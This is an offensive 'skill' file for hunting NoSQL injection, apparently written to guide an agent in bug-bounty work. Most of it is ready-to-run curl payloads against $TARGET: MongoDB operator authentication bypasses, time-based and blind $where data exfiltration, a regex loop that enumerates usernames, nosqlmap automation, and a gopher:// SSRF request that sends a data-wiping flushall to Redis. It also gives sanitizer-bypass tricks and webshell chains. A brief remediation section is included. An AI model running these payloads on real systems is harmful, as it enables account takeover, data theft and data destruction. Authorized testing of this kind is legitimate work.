---
name: hunt-nosqli
description: Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), aggregation/$function server-side JS, GraphQL-variable operator injection, mongo-sanitize bypass, CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages.
sources: hackerone_public, portswigger_research, public_research
report_count: 14
cwe: [CWE-943, CWE-89, CWE-74]
cvss_baseline: "Medium (6.5) blind char-exfil only → High (7.5-8.2) full user-collection dump → Critical (9.8) auth bypass as admin or $where/$function RCE-class server-side JS."
related_skills: [hunt-sqli, hunt-graphql, hunt-auth-bypass, hunt-ssrf, hunt-api-misconfig]
---

# HUNT-NOSQLI — NoSQL Injection

## Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).

**Highest-value chains:**
- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
- **$where JS injection** — if $where is enabled: blind injection → data exfil
- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
- **Elasticsearch injection** — _search endpoint with Groovy script injection (pre-5.0) → RCE

---

## Attack Surface Signals

### URL & Param Patterns
```
/api/users/login         POST with JSON body
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting JSON body with username/password
```

### Stack Signals
| Signal | Vector |
|--------|--------|
| MongoDB error messages in response | Operator injection |
| mongoose / monk in JS bundles | ODM patterns |
| X-Powered-By: Express | Node.js + MongoDB common stack |
| CouchDB/_utils UI exposed | Futon/Fauxton admin |
| Redis port 6379 open (via SSRF) | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 open | Script injection |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Auth Bypass (MongoDB)
```bash
# Operator injection in JSON body
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### Phase 2 — URL Parameter Injection
```bash
# Array notation (Express/PHP-style)
curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"

# POST form data
curl "https://$TARGET/api/login" \
  --data "username[$gt]=&password[$gt]="
```

### Phase 3 — $where Blind Injection (time-based)
```bash
# Test if $where is enabled (time-based detection, 5s delay)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
# If response takes 5+ seconds → $where injection confirmed

# Blind data exfil (username starts with 'a'?)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)
When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
```
fuzz:  ' " ` { ; $         # any 500/behaviour change = syntax reaches the query
' || '1'=='1               # always-true (string-context breakout)
' && this.password.match(/^a/) || 'x'=='y   # boolean char-exfil oracle
```
(PortSwigger: Injecting syntax into NoSQL queries.)

### Phase 4 — Data Dump via Regex
```bash
# Enumerate usernames character by character
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### Phase 5 — Automation
```bash
# nosqlmap
pip3 install nosqlmap
nosqlmap -u "https://$TARGET/api/login" --attack 1

# nosqlmap data extraction
nosqlmap -u "https://$TARGET/api/login" --attack 2
```

### Phase 6 — Redis via SSRF
```bash
# If SSRF found, probe internal Redis via gopher://
curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"

# CONFIG SET webshell (if Redis has write access to web root)
# Use SLAVEOF for OOB data exfil
```

---

## New Techniques (2024-2026)

### Operator injection through GraphQL variables / JSON bodies
GraphQL resolvers that pass a filter object straight to Mongo are operator-injectable via the variables map:
```json
{"query":"query($f:UserFilter){users(filter:$f){email}}",
 "variables":{"f":{"username":{"$ne":null}}}}
```
Any JSON API whose body becomes a query filter (`find(req.body.filter)`) is the same bug. Cross-ref `hunt-graphql`.

### Aggregation-pipeline & `$function` / `$accumulate` injection (MongoDB 4.4+)
If input reaches an aggregation stage, server-side JS is reachable again even when `$where` is disabled:
```json
{"$match":{"$expr":{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}}}
```
`$function`/`$accumulator` execute JS in the DB process → blind exfil / DoS. Also abuse `$lookup` to join and leak other collections, and `$expr`+`$regexMatch` for char-exfil oracles.

### mongo-sanitize / express-mongo-sanitize bypass
Sanitizers that strip keys starting with `$` or containing `.` are bypassable:
- **Dotted-path keys** when only `$` is filtered: `{"user.role":"admin"}` (reaches nested field).
- **`$`-replacement gaps** — some configs replace `$` with a benign char but leave `{"$ne":...}` reachable via unicode (`＄ne`, full-width) or via arrays/HPP (`user[$ne]=`).
- **Prototype-pollution-adjacent** `__proto__`/`constructor` keys slipping through. Cross-ref `hunt-prototype-pollution`.

### Type-juggling / array-coercion in typed stacks
Sending `password[$ne]=` (array) where a string is expected makes Mongoose cast it to an operator object even on "typed" schemas if `strictQuery` is off. Always try the array form when JSON objects are rejected.

## Tooling

- **NoSQLMap** — auth-bypass + data-extraction automation (authorized, rate-limited).
- **Burp** — intruder operator permutations; **GraphQL Raider / InQL** for variable-injection.
- **mongosh** against a lab instance to validate `$function`/aggregation payloads before firing at the target.

## Bypass Table

| Defense | Bypass |
|---------|--------|
| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
| Sanitizes `$` | Unicode/full-width `＄gt`, or dotted keys `user.role` |
| Blocks operator keys | Nested objects deeper in structure, or `$expr`/aggregation stage |
| `$where` disabled | `$function`/`$accumulator` in an aggregation `$expr` |
| express-mongo-sanitize strips `$`/`.` | dotted path when only `$` filtered; `__proto__` key; HPP array form |

## Remediation

- Cast and validate input types before building queries (enforce string/number at the schema; Mongoose `strictQuery`); never pass `req.body`/`req.query` objects directly into `find()`/filters.
- Disable server-side JS (`$where`, `$function`, `$accumulator`) at the DB (`--noscripting`) unless strictly needed.
- Use parameterized/ODM query builders with explicit field+operator allowlists; reject keys starting with `$` or containing `.` at the boundary (and treat sanitizers as defense-in-depth, not the only control).
- For GraphQL, validate filter inputs against a strict schema; don't forward arbitrary filter objects to the DB.

---

## Chain Table

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| User enum via regex | Credential stuffing | Mass ATO |
| $where enabled | Arbitrary JS in DB process | Data exfil or DoS |
| Redis via SSRF | CONFIG SET / SLAVEOF | Webshell or data exfil |

---

## Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium
